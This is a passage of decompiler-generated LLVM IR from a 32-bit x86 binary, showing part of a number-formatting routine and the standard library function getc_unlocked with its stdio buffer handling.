  %v4_805520e = and i8 %v3_805520e, 16
  %v5_805520e = icmp eq i8 %v4_805520e, 0
  br i1 %v5_805520e, label %dec_label_pc_8055231, label %dec_label_pc_8055214

dec_label_pc_8055214:                             ; preds = %dec_label_pc_8055207, %dec_label_pc_8055200
  %v0_8055214 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055216 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055216 = sub i32 %v0_8055214, %v1_8055216
  store i32 %v2_8055216, i32* %eax.global-to-local, align 4
  %v1_8055218 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8055218 = sub i32 %v2_8055216, %v1_8055218
  %v8_8055218 = xor i32 %v1_8055218, %v2_8055216
  %v9_8055218 = xor i32 %v2_8055218, %v2_8055216
  %v10_8055218 = and i32 %v9_8055218, %v8_8055218
  %v11_8055218 = icmp slt i32 %v10_8055218, 0
  %v13_8055218 = icmp slt i32 %v2_8055218, 0
  %v2_805521a = icmp eq i1 %v13_8055218, %v11_8055218
  br i1 %v2_805521a, label %dec_label_pc_8055231, label %dec_label_pc_805521c

dec_label_pc_805521c:                             ; preds = %dec_label_pc_8055214
  %v2_805521c = sub i32 %v1_8055218, %v2_8055216
  store i32 %v2_805521c, i32* %ebp.global-to-local, align 4
  %v1_805521e = inttoptr i32 %v0_805521e to i32*
  store i32 176, i32* %v1_805521e, align 4
  %v0_8055224 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055224 = load i32, i32* @ecx, align 4
  %v2_8055224 = add i32 %v1_8055224, 4
  %v3_8055224 = inttoptr i32 %v2_8055224 to i32*
  store i32 %v0_8055224, i32* %v3_8055224, align 4
  %v0_8055227 = load i32, i32* @ecx, align 4
  %v1_8055227 = add i32 %v0_8055227, 8
  %v2_8055227 = inttoptr i32 %v1_8055227 to i32*
  store i32 ptrtoint (i32* @global_var_805a4d3.548 to i32), i32* %v2_8055227, align 4
  %v0_805522e = load i32, i32* @ecx, align 4
  %v1_805522e = add i32 %v0_805522e, 12
  store i32 %v1_805522e, i32* @ecx, align 4
  br label %dec_label_pc_8055231

dec_label_pc_8055231:                             ; preds = %dec_label_pc_8055214, %dec_label_pc_8055207, %dec_label_pc_805521c
  %v1_80552b484 = phi i32 [ %v0_805521e, %dec_label_pc_8055214 ], [ %v0_805521e, %dec_label_pc_8055207 ], [ %v1_805522e, %dec_label_pc_805521c ]
  %v12_8055231 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8055231, label %dec_label_pc_80552a7, label %dec_label_pc_8055238

dec_label_pc_8055238:                             ; preds = %dec_label_pc_8055231
  %v0_805523f = load i32, i32* %esi.global-to-local, align 4
  %v2_805523f = icmp slt i32 %v0_805523f, 0
  %v1_8055241 = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_805523f, i32* %edx.global-to-local, align 4
  br i1 %v2_805523f, label %dec_label_pc_8055250, label %dec_label_pc_8055247

dec_label_pc_8055247:                             ; preds = %dec_label_pc_8055238
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055259

dec_label_pc_8055250:                             ; preds = %dec_label_pc_8055238
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_8055257 = sub i32 0, %v0_805523f
  store i32 %v1_8055257, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055259

dec_label_pc_8055259:                             ; preds = %dec_label_pc_8055247, %dec_label_pc_8055250
  %v0_805526d77 = phi i32 [ %v0_805523f, %dec_label_pc_8055247 ], [ %v1_8055257, %dec_label_pc_8055250 ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8055261 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8055261, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805526d

dec_label_pc_805526d:                             ; preds = %dec_label_pc_805526d.backedge, %dec_label_pc_8055259
  %v0_805527b = phi i32 [ %v0_805527e, %dec_label_pc_805526d.backedge ], [ 2, %dec_label_pc_8055259 ]
  %v0_8055277 = phi i32 [ %v0_8055277.pre, %dec_label_pc_805526d.backedge ], [ %v2_8055261, %dec_label_pc_8055259 ]
  %v0_805526d = phi i32 [ %v9_8055275, %dec_label_pc_805526d.backedge ], [ %v0_805526d77, %dec_label_pc_8055259 ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_8055274 = ashr i32 %v0_805526d, 31
  %v2_8055275 = zext i32 %v0_805526d to i64
  %v4_8055275 = zext i32 %v1_8055274 to i64
  %v5_8055275 = mul nuw i64 %v4_8055275, 4294967296
  %v6_8055275 = or i64 %v5_8055275, %v2_8055275
  %v8_8055275 = sdiv i64 %v6_8055275, 10
  %v9_8055275 = trunc i64 %v8_8055275 to i32
  store i32 %v9_8055275, i32* %eax.global-to-local, align 4
  %v11_8055275 = srem i64 %v6_8055275, 10
  %v12_8055275 = trunc i64 %v11_8055275 to i8
  %v1_8055277 = add i32 %v0_8055277, -1
  store i32 %v1_8055277, i32* %ebx.global-to-local, align 4
  %v1_8055278 = add i8 %v12_8055275, 48
  %v1_805527b = add i32 %v0_805527b, 1
  store i32 %v1_805527b, i32* %esi.global-to-local, align 4
  %v3_805527c = inttoptr i32 %v1_8055277 to i8*
  store i8 %v1_8055278, i8* %v3_805527c, align 1
  %v0_805527e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_8055275, i32* %edx.global-to-local, align 4
  %v7_8055283 = icmp sgt i32 %v0_805527e, 3
  br i1 %v7_8055283, label %dec_label_pc_8055285, label %dec_label_pc_805526d.backedge

dec_label_pc_8055285:                             ; preds = %dec_label_pc_805526d
  %v2_8055285 = icmp eq i32 %v9_8055275, 0
  %v1_8055287 = icmp eq i1 %v2_8055285, false
  br i1 %v1_8055287, label %dec_label_pc_805526d.backedge, label %dec_label_pc_8055289

dec_label_pc_805526d.backedge:                    ; preds = %dec_label_pc_8055285, %dec_label_pc_805526d
  %v0_8055277.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805526d

dec_label_pc_8055289:                             ; preds = %dec_label_pc_8055285
  %v0_8055289 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8055289, i32* %edx.global-to-local, align 4
  %v0_805528b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805528b = add i32 %v0_805528b, -2
  store i32 %v1_805528b, i32* %eax.global-to-local, align 4
  %v1_805528e = trunc i32 %v0_8055289 to i8
  %v3_805528e = add i32 %v0_805528b, -1
  %v4_805528e = inttoptr i32 %v3_805528e to i8*
  store i8 %v1_805528e, i8* %v4_805528e, align 1
  %v5_8055291 = load i32, i32* %edx.global-to-local, align 4
  %v6_8055291 = and i32 %v5_8055291, -256
  %v7_8055291 = or i32 %v6_8055291, %stack_var_-42.0
  store i32 %v7_8055291, i32* %edx.global-to-local, align 4
  %v2_8055295 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8055295 = add i32 %v2_8055295, -2
  %v4_8055295 = inttoptr i32 %v3_8055295 to i8*
  store i8 %v1_8055241, i8* %v4_8055295, align 1
  %v0_8055298 = load i32, i32* @ecx, align 4
  %v1_8055298 = inttoptr i32 %v0_8055298 to i32*
  store i32 112, i32* %v1_8055298, align 4
  %v0_805529e = load i32, i32* %esi.global-to-local, align 4
  %v1_805529e = load i32, i32* @ecx, align 4
  %v2_805529e = add i32 %v1_805529e, 4
  %v3_805529e = inttoptr i32 %v2_805529e to i32*
  store i32 %v0_805529e, i32* %v3_805529e, align 4
  %v0_80552a1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80552a1 = load i32, i32* @ecx, align 4
  %v2_80552a1 = add i32 %v1_80552a1, 8
  %v3_80552a1 = inttoptr i32 %v2_80552a1 to i32*
  store i32 %v0_80552a1, i32* %v3_80552a1, align 4
  %v0_80552a4 = load i32, i32* @ecx, align 4
  %v1_80552a4 = add i32 %v0_80552a4, 12
  store i32 %v1_80552a4, i32* @ecx, align 4
  br label %dec_label_pc_80552a7

dec_label_pc_80552a7:                             ; preds = %dec_label_pc_8055231, %dec_label_pc_8054ecc, %dec_label_pc_8055289
  %v0_8055328 = phi i32 [ %v1_80552b484, %dec_label_pc_8055231 ], [ %v2_8054ed4, %dec_label_pc_8054ecc ], [ %v1_80552a4, %dec_label_pc_8055289 ]
  %v2_80552a7 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_80552a7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80552ab

dec_label_pc_80552ab:                             ; preds = %dec_label_pc_80552ab, %dec_label_pc_80552a7
  %v0_80552ab = phi i32 [ %v2_80552a7, %dec_label_pc_80552a7 ], [ %v1_80552ad, %dec_label_pc_80552ab ]
  %stack_var_-216.0 = phi i32 [ %v3_8054dbf, %dec_label_pc_80552a7 ], [ %v5_80552b0, %dec_label_pc_80552ab ]
  %v1_80552ab = inttoptr i32 %v0_80552ab to i32*
  %v2_80552ab = load i32, i32* %v1_80552ab, align 4
  store i32 %v2_80552ab, i32* %edx.global-to-local, align 4
  %v1_80552ad = add i32 %v0_80552ab, 12
  store i32 %v1_80552ad, i32* %eax.global-to-local, align 4
  %v5_80552b0 = sub i32 %stack_var_-216.0, %v2_80552ab
  %v7_80552b4 = icmp ult i32 %v1_80552ad, %v0_8055328
  br i1 %v7_80552b4, label %dec_label_pc_80552ab, label %dec_label_pc_80552b8

dec_label_pc_80552b8:                             ; preds = %dec_label_pc_80552ab
  %v5_80552c1 = icmp eq i8 %stack_var_-26.0, 0
  %v1_80552d1 = icmp eq i1 %v5_80552c1, false
  %v2_80552d1 = zext i1 %v1_80552d1 to i32
  %v2_80552d4 = sub i32 %v5_80552b0, %v2_80552d1
  store i32 %v2_80552d4, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_80552d4, i32* %eax.global-to-local, align 4
  store i32 %v0_8055328, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_80552d4, 1
  br i1 %tmp141, label %dec_label_pc_805532a, label %dec_label_pc_80552ea

dec_label_pc_80552ea:                             ; preds = %dec_label_pc_80552b8
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_80552f1 = inttoptr i32 %v1_8054dff to i8*
  %v3_80552f1 = load i8, i8* %v2_80552f1, align 1
  %v4_80552f1 = and i8 %v3_80552f1, 8
  %v5_80552f1 = icmp eq i8 %v4_80552f1, 0
  br i1 %v5_80552f1, label %dec_label_pc_805530c, label %dec_label_pc_80552f7

dec_label_pc_80552f7:                             ; preds = %dec_label_pc_80552ea
  %v1_80552f7 = add i32 %v0_8055328, 12
  store i32 %v1_80552f7, i32* %esi.global-to-local, align 4
  %v1_80552fa = inttoptr i32 %v0_8055328 to i32*
  store i32 160, i32* %v1_80552fa, align 4
  %v0_8055300 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055300 = load i32, i32* @ecx, align 4
  %v2_8055300 = add i32 %v1_8055300, 4
  %v3_8055300 = inttoptr i32 %v2_8055300 to i32*
  store i32 %v0_8055300, i32* %v3_8055300, align 4
  %v0_8055303 = load i32, i32* @ecx, align 4
  %v1_8055303 = add i32 %v0_8055303, 8
  %v2_8055303 = inttoptr i32 %v1_8055303 to i32*
  store i32 ptrtoint (i32* @global_var_805a4d3.548 to i32), i32* %v2_8055303, align 4
  br label %dec_label_pc_805532a

dec_label_pc_805530c:                             ; preds = %dec_label_pc_80552ea
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8055313 = add i32 %tmp112, 16
  %v2_8055313 = inttoptr i32 %v1_8055313 to i32*
  %v3_8055313 = load i32, i32* %v2_8055313, align 4
  %v9_8055313 = icmp eq i32 %v3_8055313, 48
  %v1_8055317 = icmp eq i1 %v9_8055313, false
  br i1 %v1_8055317, label %dec_label_pc_8055324, label %dec_label_pc_8055319

dec_label_pc_8055319:                             ; preds = %dec_label_pc_805530c
  %v3_8055319 = load i32, i32* %stack_var_-152, align 4
  %v5_8055319 = add i32 %v3_8055319, %v2_80552d4
  store i32 %v5_8055319, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8055328

dec_label_pc_805531f:                             ; preds = %dec_label_pc_8055330
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055357

dec_label_pc_8055324:                             ; preds = %dec_label_pc_805530c
  br label %dec_label_pc_8055328

dec_label_pc_8055328:                             ; preds = %dec_label_pc_8055319, %dec_label_pc_8055324
  store i32 %v0_8055328, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805532a

dec_label_pc_805532a:                             ; preds = %dec_label_pc_80552b8, %dec_label_pc_80552f7, %dec_label_pc_8055328
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_805532c = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_805532c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055330

dec_label_pc_8055330:                             ; preds = %dec_label_pc_805534e, %dec_label_pc_805532a
  call void @__pseudo_call(i32 %tmp112)
  %v0_8055349 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055349 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055349 = add i32 %v1_8055349, 4
  %v3_8055349 = inttoptr i32 %v2_8055349 to i32*
  %v4_8055349 = load i32, i32* %v3_8055349, align 4
  %v15_8055349 = icmp eq i32 %v0_8055349, %v4_8055349
  %v1_805534c = icmp eq i1 %v15_8055349, false
  br i1 %v1_805534c, label %dec_label_pc_805531f, label %dec_label_pc_805534e

dec_label_pc_805534e:                             ; preds = %dec_label_pc_8055330
  %v1_805534e = add i32 %v1_8055349, 12
  store i32 %v1_805534e, i32* %ebx.global-to-local, align 4
  %v0_8055351 = load i32, i32* %edi.global-to-local, align 4
  %v2_8055351 = add i32 %v0_8055351, %v0_8055349
  store i32 %v2_8055351, i32* %edi.global-to-local, align 4
  %v1_8055353 = load i32, i32* %esi.global-to-local, align 4
  %v7_8055353 = icmp ult i32 %v1_805534e, %v1_8055353
  br i1 %v7_8055353, label %dec_label_pc_8055330, label %dec_label_pc_8055357

dec_label_pc_8055357:                             ; preds = %dec_label_pc_805534e, %dec_label_pc_805531f
  %v0_805535d = phi i32 [ -1, %dec_label_pc_805531f ], [ %v2_8055351, %dec_label_pc_805534e ]
  store i32 %v0_805535d, i32* %eax.global-to-local, align 4
  %v2_8055360 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055360, i32* @esi, align 4
  store i32 %v0_8054da2, i32* @edi, align 4
  store i32 %v0_8054da1, i32* @ebp, align 4
  ret i32 %v0_805535d

; uselistorder directives
  uselistorder i32 %v0_805535d, { 1, 0 }
  uselistorder i32 %v1_80552ad, { 1, 2, 0 }
  uselistorder i32 %v0_80552ab, { 1, 0 }
  uselistorder i32 %v0_8055328, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_805527e, { 1, 0 }
  uselistorder i32 %v9_8055275, { 1, 2, 3, 0 }
  uselistorder i32 %v0_805526d, { 1, 0 }
  uselistorder i32 %v0_805523f, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8055218, { 1, 0 }
  uselistorder i32 %v1_8055218, { 1, 0, 2 }
  uselistorder i32 %v2_8055216, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_805514c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8055132, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8055197, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_80550fd, { 0, 2, 1 }
  uselistorder i32 %v1_80550d6, { 1, 0 }
  uselistorder i32 %v0_80550d1, { 1, 2, 0, 3 }
  uselistorder i32 %v2_805509e, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8055099, { 1, 0 }
  uselistorder i8 %v2_8055092, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8055092, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805501c, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_8055001, { 1, 0 }
  uselistorder i32 %v1_8054fed, { 1, 0 }
  uselistorder i32 %v0_8054fe1, { 1, 0 }
  uselistorder i32 %v4_8054fc8, { 1, 0 }
  uselistorder i32 %tmp149, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8054fcd, { 1, 0 }
  uselistorder i32 %v2_8054f8b, { 1, 0, 2 }
  uselistorder i3 %v1_8054e41, { 1, 0 }
  uselistorder i8 %v4_8054ec0, { 1, 0 }
  uselistorder i32 %v3_8054dff, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_8054dff, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_8054dd1, { 1, 0 }
  uselistorder i32 %v3_8054dbf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st1.global-to-local, { 1, 0, 2 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12, 13, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6, 9, 13, 12, 14, 10, 11, 15, 18, 16, 19, 17, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 4, 5, 3, 6, 7, 8, 9, 23, 10, 11, 24, 13, 14, 12, 18, 15, 16, 17, 19, 20, 21, 22 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 2, 7, 8, 3, 9, 6, 4, 10, 5, 11 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 5, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i32 165, { 1, 0 }
  uselistorder i32 21, { 1, 2, 0 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805532a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055328, { 1, 0 }
  uselistorder label %dec_label_pc_80552a7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055259, { 1, 0 }
  uselistorder label %dec_label_pc_8055231, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055200, { 1, 0 }
  uselistorder label %dec_label_pc_80551ed, { 1, 0 }
  uselistorder label %dec_label_pc_80551d3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80551a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805518b, { 1, 0 }
  uselistorder label %dec_label_pc_8055180, { 1, 0 }
  uselistorder label %dec_label_pc_8055107, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80550f9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80550bf, { 1, 0 }
  uselistorder label %dec_label_pc_805508f.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_805505b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805502a, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055015, { 1, 0 }
  uselistorder label %dec_label_pc_8054ecc, { 1, 0 }
  uselistorder label %dec_label_pc_8054df0, { 1, 0 }
  uselistorder label %dec_label_pc_8054de7, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_6()
  %stack_var_-5 = alloca i8, align 1
  %v0_8055364 = load i32, i32* @ebx, align 4
  %v4_8055368 = ptrtoint i16* %tmp to i32
  store i32 %v4_8055368, i32* @ebx, align 4
  %v1_805536c = add i32 %v4_8055368, 16
  %v2_805536c = inttoptr i32 %v1_805536c to i32*
  %v3_805536c = load i32, i32* %v2_805536c, align 4
  %v2_805536f = add i32 %v4_8055368, 24
  %v3_805536f = inttoptr i32 %v2_805536f to i32*
  %v4_805536f = load i32, i32* %v3_805536f, align 4
  %v10_805536f = icmp ult i32 %v3_805536c, %v4_805536f
  br i1 %v10_805536f, label %dec_label_pc_8055411, label %dec_label_pc_8055378

dec_label_pc_8055378:                             ; preds = %entry
  %v2_8055378 = load i16, i16* %tmp, align 2
  %v3_8055378 = zext i16 %v2_8055378 to i32
  %v1_805537b = and i32 %v3_8055378, 131
  %v6_8055385 = icmp ugt i32 %v1_805537b, 128
  br i1 %v6_8055385, label %dec_label_pc_805539f, label %dec_label_pc_8055387

dec_label_pc_8055387:                             ; preds = %dec_label_pc_8055378
  %v0_8055387 = load i32, i32* @edx, align 4
  %v6_805538f = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8055387, i32 %v0_8055387)
  %v1_8055397 = icmp eq i32 %v6_805538f, 0
  %v1_8055399 = icmp eq i1 %v1_8055397, false
  br i1 %v1_8055399, label %dec_label_pc_8055436, label %dec_label_pc_8055387.dec_label_pc_805539f_crit_edge

dec_label_pc_8055387.dec_label_pc_805539f_crit_edge: ; preds = %dec_label_pc_8055387
  %v0_805539f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805539f

dec_label_pc_805539f:                             ; preds = %dec_label_pc_8055387.dec_label_pc_805539f_crit_edge, %dec_label_pc_8055378
  %v2_80553d3 = phi i32 [ %v0_805539f.pre, %dec_label_pc_8055387.dec_label_pc_805539f_crit_edge ], [ %v4_8055368, %dec_label_pc_8055378 ]
  %v1_805539f = inttoptr i32 %v2_80553d3 to i32*
  %v2_805539f = load i32, i32* %v1_805539f, align 4
  store i32 %v2_805539f, i32* @ecx, align 4
  %v1_80553a1 = urem i32 %v2_805539f, 65536
  store i32 %v1_80553a1, i32* %edx.global-to-local, align 4
  %v2_80553a4 = and i32 %v2_805539f, 2
  %v3_80553a4 = icmp eq i32 %v2_80553a4, 0
  br i1 %v3_80553a4, label %dec_label_pc_80553c2, label %dec_label_pc_80553a9

dec_label_pc_80553a9:                             ; preds = %dec_label_pc_805539f
  %v1_80553a9 = urem i32 %v2_805539f, 2
  store i32 %v1_80553a9, i32* %edx.global-to-local, align 4
  %v1_80553ac = add i32 %v2_805539f, 65535
  %v1_80553af = trunc i32 %v1_80553ac to i16
  %v3_80553af = inttoptr i32 %v2_80553d3 to i16*
  store i16 %v1_80553af, i16* %v3_80553af, align 2
  %v0_80553b2 = load i32, i32* @ebx, align 4
  %v1_80553b2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80553b2 = mul i32 %v1_80553b2, 4
  %v3_80553b2 = add i32 %v0_80553b2, 36
  %v4_80553b2 = add i32 %v3_80553b2, %v2_80553b2
  %v5_80553b2 = inttoptr i32 %v4_80553b2 to i8*
  %v6_80553b2 = load i8, i8* %v5_80553b2, align 1
  %v7_80553b2 = zext i8 %v6_80553b2 to i32
  %v9_80553b2 = and i32 %v1_80553b2, -256
  %v10_80553b2 = or i32 %v7_80553b2, %v9_80553b2
  store i32 %v10_80553b2, i32* %edx.global-to-local, align 4
  %v1_80553b6 = add i32 %v0_80553b2, 40
  %v2_80553b6 = inttoptr i32 %v1_80553b6 to i32*
  store i32 0, i32* %v2_80553b6, align 4
  %v0_80553bd = load i32, i32* %edx.global-to-local, align 4
  %v1_80553bd = urem i32 %v0_80553bd, 256
  store i32 %v1_80553bd, i32* @edx, align 4
  br label %dec_label_pc_8055439

dec_label_pc_80553c2:                             ; preds = %dec_label_pc_805539f
  %v1_80553c2 = add i32 %v2_80553d3, 16
  %v2_80553c2 = inttoptr i32 %v1_80553c2 to i32*
  %v3_80553c2 = load i32, i32* %v2_80553c2, align 4
  store i32 %v3_80553c2, i32* @eax, align 4
  %v1_80553c5 = add i32 %v2_80553d3, 20
  %v2_80553c5 = inttoptr i32 %v1_80553c5 to i32*
  %v3_80553c5 = load i32, i32* %v2_80553c5, align 4
  %v15_80553c5 = icmp eq i32 %v3_80553c5, %v3_80553c2
  %v1_80553c8 = icmp eq i1 %v15_80553c5, false
  br i1 %v1_80553c8, label %dec_label_pc_8055411, label %dec_label_pc_80553ca

dec_label_pc_80553ca:                             ; preds = %dec_label_pc_80553c2
  %v1_80553ca = add i32 %v2_80553d3, 4
  %v2_80553ca = inttoptr i32 %v1_80553ca to i32*
  %v3_80553ca = load i32, i32* %v2_80553ca, align 4
  %v13_80553ca = icmp eq i32 %v3_80553ca, -2
  %v1_80553ce = icmp eq i1 %v13_80553ca, false
  br i1 %v1_80553ce, label %dec_label_pc_80553d8, label %dec_label_pc_80553d0

dec_label_pc_80553d0:                             ; preds = %dec_label_pc_80553ca
  %v1_80553d0 = or i32 %v2_805539f, 4
  store i32 %v1_80553d0, i32* @ecx, align 4
  %v1_80553d3 = trunc i32 %v1_80553d0 to i16
  %v3_80553d3 = inttoptr i32 %v2_80553d3 to i16*
  store i16 %v1_80553d3, i16* %v3_80553d3, align 2
  br label %dec_label_pc_8055436

dec_label_pc_80553d8:                             ; preds = %dec_label_pc_80553ca
  %v1_80553d8 = udiv i32 %v2_805539f, 256
  %v2_80553d8 = trunc i32 %v1_80553d8 to i8
  %v3_80553d8 = urem i8 %v2_80553d8, 4
  %v4_80553d8 = icmp eq i8 %v3_80553d8, 0
  %v8_80553d8 = zext i8 %v3_80553d8 to i32
  %v10_80553d8 = mul nuw nsw i32 %v8_80553d8, 256
  %v11_80553d8 = urem i32 %v2_805539f, 256
  %v12_80553d8 = or i32 %v10_80553d8, %v11_80553d8
  store i32 %v12_80553d8, i32* %edx.global-to-local, align 4
  br i1 %v4_80553d8, label %dec_label_pc_80553ed, label %dec_label_pc_80553dd

dec_label_pc_80553dd:                             ; preds = %dec_label_pc_80553d8
  %v3_80553e5 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_805b2b8.469 to i16*))
  %v0_80553ed.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80553ed

dec_label_pc_80553ed:                             ; preds = %dec_label_pc_80553d8, %dec_label_pc_80553dd
  %v0_8055422 = phi i32 [ %v2_80553d3, %dec_label_pc_80553d8 ], [ %v0_80553ed.pre, %dec_label_pc_80553dd ]
  %v1_80553ed = add i32 %v0_8055422, 8
  %v2_80553ed = inttoptr i32 %v1_80553ed to i32*
  %v3_80553ed = load i32, i32* %v2_80553ed, align 4
  %v1_80553f0 = add i32 %v0_8055422, 12
  %v2_80553f0 = inttoptr i32 %v1_80553f0 to i32*
  %v3_80553f0 = load i32, i32* %v2_80553f0, align 4
  %v15_80553f0 = icmp eq i32 %v3_80553f0, %v3_80553ed
  br i1 %v15_80553f0, label %dec_label_pc_805541a, label %dec_label_pc_80553f5

dec_label_pc_80553f5:                             ; preds = %dec_label_pc_80553ed
  %v2_80553f8 = add i32 %v0_8055422, 24
  %v3_80553f8 = inttoptr i32 %v2_80553f8 to i32*
  store i32 %v3_80553ed, i32* %v3_80553f8, align 4
  %v0_80553fb = load i32, i32* @ebx, align 4
  %v2_80553fc = call i32 @__stdio_rfill(i32 %v0_80553fb)
  %v1_8055404 = icmp eq i32 %v2_80553fc, 0
  br i1 %v1_8055404, label %dec_label_pc_8055436, label %dec_label_pc_8055408

dec_label_pc_8055408:                             ; preds = %dec_label_pc_80553f5
  %v0_8055408 = load i32, i32* @ebx, align 4
  %v1_8055408 = add i32 %v0_8055408, 20
  %v2_8055408 = inttoptr i32 %v1_8055408 to i32*
  %v3_8055408 = load i32, i32* %v2_8055408, align 4
  %v2_805540b = add i32 %v0_8055408, 24
  %v3_805540b = inttoptr i32 %v2_805540b to i32*
  store i32 %v3_8055408, i32* %v3_805540b, align 4
  %v0_805540e = load i32, i32* @ebx, align 4
  %v1_805540e = add i32 %v0_805540e, 16
  %v2_805540e = inttoptr i32 %v1_805540e to i32*
  %v3_805540e = load i32, i32* %v2_805540e, align 4
  br label %dec_label_pc_8055411

dec_label_pc_8055411:                             ; preds = %dec_label_pc_80553c2, %entry, %dec_label_pc_8055408
  %v1_8055415 = phi i32 [ %v2_80553d3, %dec_label_pc_80553c2 ], [ %v4_8055368, %entry ], [ %v0_805540e, %dec_label_pc_8055408 ]
  %v0_8055411 = phi i32 [ %v3_80553c2, %dec_label_pc_80553c2 ], [ %v3_805536c, %entry ], [ %v3_805540e, %dec_label_pc_8055408 ]
  %v1_8055411 = inttoptr i32 %v0_8055411 to i8*
  %v2_8055411 = load i8, i8* %v1_8055411, align 1
  %v3_8055411 = zext i8 %v2_8055411 to i32
  store i32 %v3_8055411, i32* @edx, align 4
  %v1_8055414 = add i32 %v0_8055411, 1
  %v2_8055415 = add i32 %v1_8055415, 16
  %v3_8055415 = inttoptr i32 %v2_8055415 to i32*
  store i32 %v1_8055414, i32* %v3_8055415, align 4
  %v0_8055439.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8055439

dec_label_pc_805541a:                             ; preds = %dec_label_pc_80553ed
  %v2_805541d = ptrtoint i8* %stack_var_-5 to i32
